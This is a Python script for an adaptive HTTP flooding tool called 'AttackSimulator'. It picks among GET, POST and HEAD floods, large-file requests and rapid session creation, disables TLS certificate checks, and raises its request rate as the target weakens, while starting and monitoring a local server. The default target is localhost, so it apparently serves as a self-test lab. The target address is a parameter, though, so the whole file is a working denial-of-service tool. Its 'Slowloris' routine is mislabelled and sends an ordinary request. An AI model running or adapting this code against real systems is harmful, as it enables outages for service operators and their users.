import subprocess
import time
import asyncio
import csv
import psutil
import numpy as np
import aiohttp
import random
import ssl
import logging
from collections import deque
from aiohttp import TCPConnector

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class AttackVector:
    def __init__(self, name, attack_function, weight=1.0):
        self.name = name
        self.attack_function = attack_function
        self.weight = weight
        self.success_count = 0
        self.fail_count = 0

    def update_stats(self, success):
        if success:
            self.success_count += 1
        else:
            self.fail_count += 1

class AttackSimulator:
    def __init__(self, target_ip, target_port, duration, initial_rate, size, output_file):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.initial_rate = initial_rate
        self.current_rate = initial_rate
        self.size = size
        self.output_file = output_file
        self.start_time = time.time()
        self.end_time = self.start_time + duration
        self.request_count = 0
        self.byte_count = 0
        self.server_process = None
        self.server_status = "DOWN"
        self.attack_vectors = self.initialize_attack_vectors()
        self.stats_history = deque(maxlen=60)
        self.adaptive_factor = 1.0
        self.session = None
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

    def initialize_attack_vectors(self):
        return [
            AttackVector("HTTP GET Flood", self.http_get_flood),
            AttackVector("HTTP POST Flood", self.http_post_flood, weight=0.5),
            AttackVector("Slowloris", self.slowloris, weight=0.3),
            AttackVector("HTTP HEAD Flood", self.http_head_flood, weight=0.4),
            AttackVector("Large File Request", self.large_file_request, weight=0.2),
            AttackVector("Rapid Session Creation", self.rapid_session_creation, weight=0.1)
        ]

    async def http_get_flood(self):
        try:
            async with self.session.get(f'http://{self.target_ip}:{self.target_port}', ssl=self.ssl_context) as response:
                await response.text()
            return True
        except Exception as e:
            logging.error(f"GET Flood error: {e}")
            return False

    async def http_post_flood(self):
        data = {"data": "X" * self.size}
        try:
            async with self.session.post(f'http://{self.target_ip}:{self.target_port}', json=data, ssl=self.ssl_context) as response:
                await response.text()
            return True
        except Exception as e:
            logging.error(f"POST Flood error: {e}")
            return False

    async def slowloris(self):
        try:
            async with self.session.get(f'http://{self.target_ip}:{self.target_port}', headers={'X-a': 'b'}, timeout=30, ssl=self.ssl_context) as response:
                await response.text()
            return True
        except Exception as e:
            logging.error(f"Slowloris error: {e}")
            return False

    async def http_head_flood(self):
        try:
            async with self.session.head(f'http://{self.target_ip}:{self.target_port}', ssl=self.ssl_context) as response:
                await response.text()
            return True
        except Exception as e:
            logging.error(f"HEAD Flood error: {e}")
            return False

    async def large_file_request(self):
        try:
            async with self.session.get(f'http://{self.target_ip}:{self.target_port}/large_file', ssl=self.ssl_context) as response:
                await response.read()
            return True
        except Exception as e:
            logging.error(f"Large File Request error: {e}")
            return False

    async def rapid_session_creation(self):
        try:
            async with aiohttp.ClientSession() as temp_session:
                async with temp_session.get(f'http://{self.target_ip}:{self.target_port}', ssl=self.ssl_context) as response:
                    await response.text()
            return True
        except Exception as e:
            logging.error(f"Rapid Session Creation error: {e}")
            return False

    async def send_requests(self):
        connector = TCPConnector(limit=None, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as self.session:
            while time.time() < self.end_time:
                requests_to_send = int(self.current_rate * self.adaptive_factor)
                tasks = []
                for _ in range(requests_to_send):
                    attack_vector = random.choices(self.attack_vectors, weights=[av.weight for av in self.attack_vectors])[0]
                    tasks.append(asyncio.create_task(self.execute_attack(attack_vector)))

                results = await asyncio.gather(*tasks, return_exceptions=True)
                self.update_attack_stats(results)
                await asyncio.sleep(1)

    async def execute_attack(self, attack_vector):
        success = await attack_vector.attack_function()
        self.request_count += 1
        self.byte_count += self.size
        attack_vector.update_stats(success)
        return success

    def update_attack_stats(self, results):
        for result in results:
            if isinstance(result, Exception):
                error_message = f"Attack failed with error: {result}"
                logging.error(error_message)
                self.log_terminal_output(error_message)

    def log_terminal_output(self, message):
        with open("terminal_log.csv", 'a', newline='') as logfile:
            log_writer = csv.writer(logfile)
            log_writer.writerow([time.strftime("%Y-%m-%d %H:%M:%S"), message])

    def start_server(self):
        self.server_process = subprocess.Popen(['python', 'server.py'])
        self.server_status = "UP"
        logging.info("Server started")

    def check_server(self):
        if self.server_process and self.server_process.poll() is not None:
            self.server_status = "DOWN"
            logging.warning("Server crashed, restarting...")
            self.start_server()

    async def monitor_server(self):
        while time.time() < self.end_time:
            self.check_server()
            stats = self.get_stats()
            self.stats_history.append(stats)
            self.log_stats(stats)
            self.adjust_attack_intensity()
            await asyncio.sleep(1)

    def get_stats(self):
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_usage = psutil.virtual_memory().percent
        network_io = psutil.net_io_counters()
        return {
            'timestamp': time.time(),
            'requests_sent': self.request_count,
            'bytes_sent': self.byte_count,
            'cpu_usage': cpu_usage,
            'memory_usage': memory_usage,
            'network_bytes_sent': network_io.bytes_sent,
            'network_bytes_recv': network_io.bytes_recv,
            'server_status': self.server_status,
            'current_rate': self.current_rate,
            'adaptive_factor': self.adaptive_factor,
            **{f"{av.name}_success": av.success_count for av in self.attack_vectors},
            **{f"{av.name}_fail": av.fail_count for av in self.attack_vectors}
        }

    def log_stats(self, stats):
        with open(self.output_file, 'a', newline='') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=stats.keys())
            if csvfile.tell() == 0:
                writer.writeheader()
            writer.writerow(stats)

        # Log server stats separately
        server_stats = {
            'timestamp': stats['timestamp'],
            'cpu_usage': stats['cpu_usage'],
            'memory_usage': stats['memory_usage'],
            'network_bytes_sent': stats['network_bytes_sent'],
            'network_bytes_recv': stats['network_bytes_recv'],
            'server_status': stats['server_status']
        }
        with open("server_stats_log.csv", 'a', newline='') as serverfile:
            server_writer = csv.DictWriter(serverfile, fieldnames=server_stats.keys())
            if serverfile.tell() == 0:
                server_writer.writeheader()
            server_writer.writerow(server_stats)

    def adjust_attack_intensity(self):
        if len(self.stats_history) < 10:
            return

        recent_stats = list(self.stats_history)[-10:]
        avg_cpu = np.mean([stat['cpu_usage'] for stat in recent_stats])
        server_crashes = sum(1 for stat in recent_stats if stat['server_status'] == 'DOWN')
        success_rate = sum(stat['requests_sent'] for stat in recent_stats) / (
            sum(stat['requests_sent'] for stat in recent_stats) +
            sum(sum(stat[f"{av.name}_fail"] for av in self.attack_vectors) for stat in recent_stats)
        )

        if avg_cpu < 70 and server_crashes == 0 and success_rate > 0.9:
            self.adaptive_factor = min(2.0, self.adaptive_factor * 1.1)
        elif avg_cpu > 90 or server_crashes > 0 or success_rate < 0.5:
            self.adaptive_factor = max(0.5, self.adaptive_factor * 0.9)

        self.current_rate = self.initial_rate * self.adaptive_factor

        # Adjust attack vector weights
        total_requests = sum(av.success_count + av.fail_count for av in self.attack_vectors)
        if total_requests > 0:
            for av in self.attack_vectors:
                av.weight = (av.success_count / total_requests) if av.success_count > 0 else 0.1

    async def run(self):
        self.start_server()
        await asyncio.gather(self.send_requests(), self.monitor_server())

if __name__ == "__main__":
    target_ip = "127.0.0.1"
    target_port = 8080
    duration = 300  # Duration of the attack in seconds
    initial_rate = 10  # Initial requests per second
    size = 1024  # Size of requests in bytes
    output_file = "advanced_attack_log.csv"

    simulator = AttackSimulator(target_ip, target_port, duration, initial_rate, size, output_file)
    asyncio.run(simulator.run())
